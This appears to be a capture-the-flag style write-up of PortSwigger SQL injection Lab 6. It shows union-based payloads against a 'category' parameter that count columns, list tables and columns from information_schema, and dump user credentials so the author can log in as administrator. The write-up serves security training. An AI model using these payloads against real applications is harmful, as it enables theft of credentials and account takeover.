# Portswigger  SQLi-Lab 6

## SQL injection attack, listing the database contents on non-Oracle databases

In this lab we need to find a table name containing username and password then login to the application , so it has the same vulnerable GET parameter `category`

<img src="https://i.imgur.com/Y2W91ER.png"/>

First we need to identify the number of columns , we can do that with the help of `order by`

<img src="https://i.imgur.com/ABGe2Zn.png"/>

Now if I try to run `order by 3` it will give an error meaning there are only two columns in the table

<img src="https://i.imgur.com/sxagncM.png"/>

So now we can perform union based sqli

<img src="https://i.imgur.com/3LPusgn.png"/>

Let's query the version of database being used

```sql
Gifts' union select version(),null --

```

<img src="https://i.imgur.com/2no13ph.png"/>

<img src="https://i.imgur.com/mDahonp.png"/>


We can look for a cheat sheet for postgresql on how to query the table name and portswigger has made a neat little cheat sheet for this

<img src="https://i.imgur.com/1dWeQXH.png"/>

For our sqli payload will look like this

```sql
Gifts' union select table_name,null from information_schema.tables --
```

<img src="https://i.imgur.com/uaZVEuQ.png"/>

<img src="https://i.imgur.com/z8o20ha.png"/>

Neat , we have found the users table which is named `users_bkrkxr`

<img src="https://i.imgur.com/qzUmrOk.png"/>

This table contains two columns , hopefully they are `username` and `password` but we don't know that yet so we'll use the cheat sheet to get the column names as well so let's run this sqli payload to get column names as well

```sql
Gifts' union select column_name,null from information_schema.columns where table_name='users_bkrkxr' --
```

So what's happening here is that we are querying for `column_name` from information_schema.columns which holds information for all the columns in the table available in the current database with a condition in which the table matches `users_bkrkxr`

<img src="https://i.imgur.com/JZ4ZRm5.png"/>

<img src="https://i.imgur.com/jTqMoCN.png"/>

We have the names of the 2 columns now this will become easy for us to retreive the data from it

```sql
Gifts' union select username_lshein,password_adqjqk from users_bkrkxr --
```

<img src="https://i.imgur.com/gMSLGLp.png"/>

<img src="https://i.imgur.com/jCTc7hW.png"/>

Now we just need to login with adminstrator's credential

<img src="https://i.imgur.com/UUAe5lD.png"/>
